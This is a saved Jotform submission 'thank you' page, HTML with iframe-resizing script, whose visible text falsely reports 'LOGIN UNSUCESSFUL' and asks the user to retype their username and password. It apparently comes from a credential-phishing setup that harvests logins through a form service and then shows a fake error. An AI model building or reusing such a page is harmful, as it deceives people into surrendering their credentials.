...
<!-- saved from url=(0050)https://submit.jotform.com/submit/201930766605456/ -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <style type="text/css">
      ...
      * {
      ...
      @media screen and (max-width: 752px), screen and (max-device-width: 768px) and (orientation: portrait), screen and (max-device-width: 415px) and (orientation: landscape) {
        body {
          background-color: #fff;
        }
        .form-all {
  ...
  <body class="thankyou">
    <div id="stage" class="form-all">
      ...
      <div style="text-align:center;">
        <h1 style="text-align:center;">LOGIN UNSUCESSFUL</h1>
        <p style="text-align:center;">Username or Password is mistyped. Try again.</p>
      </div>
    </div>
  ...
  <script type="text/javascript">
    if (window.parent !== window) {
      ...
      window.parent.postMessage('setHeight:' + height + ':201930766605456', '*');
      window.parent.postMessage({ action: 'submission-completed' }, '*');
    }

    // Prevent duplicate submission on mobile safari, #2391271
    var isMobileSafari = (/.*(iphone|ipad|ipod).*13_[4,5].*(version).*(safari)/i).test(window.navigator.userAgent);
    if (isMobileSafari) window.history.replaceState("", "", 'https://submit.jotform.com/' + '201930766605456');
  </script>
</body></html>